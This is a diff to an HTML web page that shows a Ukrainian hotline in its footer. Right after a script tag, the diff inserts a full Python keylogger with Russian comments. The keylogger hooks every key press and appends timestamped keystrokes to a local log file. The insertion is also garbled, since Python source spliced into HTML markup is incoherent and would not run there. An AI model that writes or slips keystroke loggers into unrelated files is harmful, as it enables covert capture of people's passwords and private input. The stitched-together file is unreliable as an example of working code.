@@ -102,6 +102,28 @@
         <p>Гаряча лінія: 0 800 123 456</p>
     </footer>
 
-    <script src="script.js"></script>
+    <script src="script.js"></script>import keyboard
+from datetime import datetime
+
+LOG_FILE = "keylog.txt"  # Файл для записи нажатий
+
+def on_key_press(event):
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    log_entry = f"[{current_time}] Нажата клавиша: {event.name}\n"
+    
+    print(log_entry, end="")  # Вывод в консоль
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(log_entry)  # Запись в файл
+
+# Запуск отслеживания клавиш
+keyboard.on_press(on_key_press)
+print("Кейлоггер запущен. Для остановки нажмите Ctrl+C...")
+
+try:
+    keyboard.wait()  # Ожидание нажатий
+except KeyboardInterrupt:
+    print("\nКейлоггер остановлен.")
+finally:
+    keyboard.unhook_all()  # Отключение хуков
 </body>
 </html>
